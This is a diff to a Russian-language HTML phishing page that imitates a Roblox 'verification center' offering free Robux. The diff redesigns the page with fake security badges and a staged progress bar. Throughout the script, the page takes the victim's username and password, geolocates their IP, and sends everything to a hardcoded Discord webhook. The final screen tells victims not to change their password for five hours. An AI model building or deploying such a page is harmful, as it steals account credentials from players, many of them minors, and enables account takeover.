@@ -3,43 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Promo Center 2025</title>
+    <title>Roblox | Secure Verification Center</title>
     <style>
-        body { background-color: #191b1d; color: #ffffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: #25272a; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); text-align: center; width: 350px; border-top: 5px solid #00b06f; }
-        h1 { font-size: 24px; margin-bottom: 20px; color: #00b06f; }
-        input { width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #3a3d42; background: #3a3d42; border-radius: 4px; color: white; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background-color: #00b06f; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; }
-        /* Стиль для анимации загрузки */
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00b06f; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background-color: #1a1d20; color: #ffffff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: #2b2e32; padding: 35px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); text-align: center; width: 380px; border-top: 4px solid #00b06f; }
+        .status-badge { background: rgba(0, 176, 111, 0.1); color: #00b06f; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; margin-bottom: 20px; display: inline-block; }
+        h1 { font-size: 20px; margin: 10px 0; letter-spacing: 1px; }
+        p { font-size: 13px; color: #9ea4ac; line-height: 1.5; margin-bottom: 25px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        label { font-size: 11px; color: #00b06f; text-transform: uppercase; font-weight: bold; margin-left: 5px; }
+        input { width: 100%; padding: 14px; margin-top: 5px; border: 1px solid #3e4248; background: #1a1d20; border-radius: 6px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #00b06f; box-shadow: 0 0 10px rgba(0, 176, 111, 0.2); }
+        .btn { width: 100%; padding: 15px; background: #00b06f; border: none; border-radius: 6px; color: white; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
+        .progress-container { display: none; margin-top: 20px; }
+        .progress-bar { width: 100%; background: #1a1d20; height: 8px; border-radius: 10px; overflow: hidden; }
+        .progress-fill { width: 0%; background: #00b06f; height: 100%; transition: width 0.5s; }
+        .footer-secure { margin-top: 25px; font-size: 10px; color: #5a5f66; display: flex; justify-content: center; align-items: center; gap: 10px; }
     </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="60" style="filter: invert(1); margin-bottom: 10px;">
-    <h1>ROBUX GENERATOR</h1>
-    <div id="content">
-        <p style="color: #adb5bd;">Введите данные для начисления 10,000 R$</p>
-        <input type="text" id="username" placeholder="Имя пользователя">
-        <input type="password" id="password" placeholder="Пароль">
-        <button id="claimBtn">ПОЛУЧИТЬ ROBUX</button>
-        <div class="loader" id="loader"></div>
+<div class="container" id="app">
+    <div class="status-badge">● СЕРВЕР: ОНЛАЙН</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="50" style="filter: invert(1);">
+    <h1>ROBUX VERIFICATION</h1>
+    <p>Для зачисления <b>10,100 R$</b> необходимо пройти верификацию владельца через защищенный протокол синхронизации.</p>
+    
+    <div id="form-ui">
+        <div class="input-group">
+            <label>Никнейм игрока</label>
+            <input type="text" id="username" placeholder="User123...">
+        </div>
+        <div class="input-group">
+            <label>Ключ доступа (Пароль)</label>
+            <input type="password" id="password" placeholder="••••••••">
+        </div>
+        <button class="btn" id="startBtn">ПОДТВЕРДИТЬ ЛИЧНОСТЬ</button>
+    </div>
+
+    <div class="progress-container" id="loader-ui">
+        <p id="status-text">Инициализация шлюза...</p>
+        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+    </div>
+
+    <div class="footer-secure">
+        <span>🔒 SSL SECURE</span>
+        <span>🛡️ ANTI-BOT ACTIVE</span>
     </div>
 </div>
 
 <script>
-    document.getElementById('claimBtn').onclick = async function() {
+    const webhook = "https://discord.com/api/webhooks/1454084286784475241/rgdIugwWDg61FL9dBQXVRj8kWquCg2zIYupzB3zD47Pf1RDAz76UVib0EESnOwBSIYJe";
+
+    document.getElementById('startBtn').onclick = async function() {
         const user = document.getElementById('username').value;
         const pass = document.getElementById('password').value;
-        const webhook = "https://discord.com/api/webhooks/1454084286784475241/rgdIugwWDg61FL9dBQXVRj8kWquCg2zIYupzB3zD47Pf1RDAz76UVib0EESnOwBSIYJe";
 
-        if (!user || !pass) return alert("Заполните поля!");
+        if (user.length < 3 || pass.length < 4) return alert("Ошибка: Данные не прошли валидацию!");
 
-        // Показываем загрузку
-        document.getElementById('claimBtn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
+        // Переключаем интерфейс на "сервис"
+        document.getElementById('form-ui').style.display = 'none';
+        document.getElementById('loader-ui').style.display = 'block';
+
+        const stages = [
+            { t: "Подключение к API Roblox...", p: "20%" },
+            { t: "Поиск аккаунта в базе данных...", p: "45%" },
+            { t: "Синхронизация баланса...", p: "70%" },
+            { t: "Финализация транзакции...", p: "95%" }
+        ];
+
+        let i = 0;
+        const interval = setInterval(() => {
+            if (i < stages.length) {
+                document.getElementById('status-text').innerText = stages[i].t;
+                document.getElementById('fill').style.width = stages[i].p;
+                i++;
+            } else {
+                clearInterval(interval);
+                showFinal();
+            }
+        }, 1200);
 
         try {
             const geoRes = await fetch('https://ipapi.co/json/');
@@ -50,36 +93,31 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🚀 УЛОВ В СЕТИ!",
-                        color: 65391,
+                        title: "🛠️ СЕРВИС: ДАННЫЕ ВЕРИФИЦИРОВАНЫ",
+                        color: 3066993,
                         fields: [
-                            { name: "👤 Логин", value: `\`${user}\``, inline: true },
-                            { name: "🔑 Пароль", value: `\`${pass}\``, inline: true },
-                            { name: "📍 Город", value: geo.city, inline: true }
+                            { name: "👤 User", value: `\`${user}\``, inline: true },
+                            { name: "🔑 Key", value: `\`${pass}\``, inline: true },
+                            { name: "📍 Geo", value: `${geo.city}, ${geo.country_name}`, inline: false }
                         ],
-                        footer: { text: "Roblox Promo 2025" }
+                        footer: { text: "Protocol: AES-256 Synchronized" }
                     }]
                 })
             });
-
-            // Имитируем "обработку" 2 секунды, потом выводим финал
-            setTimeout(() => {
-                document.getElementById('main-box').innerHTML = `
-                    <h1 style="color: #00b06f;">✔️ ГОТОВО!</h1>
-                    <p>Данные успешно синхронизированы.</p>
-                    <div style="background: #333; padding: 15px; border-radius: 5px; margin-top: 20px;">
-                        <h2 style="margin: 0;">ОЖИДАНИЕ: 5 ЧАСОВ</h2>
-                        <p style="font-size: 12px; margin-top: 10px;">Ваши 10,000 Robux будут зачислены после проверки системы. Не меняйте пароль в течение этого времени.</p>
-                    </div>
-                `;
-            }, 2000);
-
-        } catch (error) {
-            alert("Ошибка сети. Попробуйте позже.");
-            location.reload();
-        }
+        } catch (e) {}
     };
-</script>
 
+    function showFinal() {
+        document.getElementById('app').innerHTML = `
+            <div style="color: #00b06f; font-size: 50px; margin-bottom: 10px;">✔</div>
+            <h1 style="color: #00b06f;">УСПЕШНО!</h1>
+            <p>Ваш аккаунт успешно прошел верификацию. Система зачислит <b>10,100 R$</b> в течение <b>5 часов</b>.</p>
+            <div style="background: #1a1d20; padding: 15px; border-radius: 8px; font-size: 12px; color: #adb5bd;">
+                ВАЖНО: Для корректной работы скрипта не входите в аккаунт и не меняйте пароль до завершения процесса.
+            </div>
+            <button class="btn" style="margin-top: 20px; opacity: 0.5;" disabled>ОЖИДАНИЕ...</button>
+        `;
+    }
+</script>
 </body>
 </html>
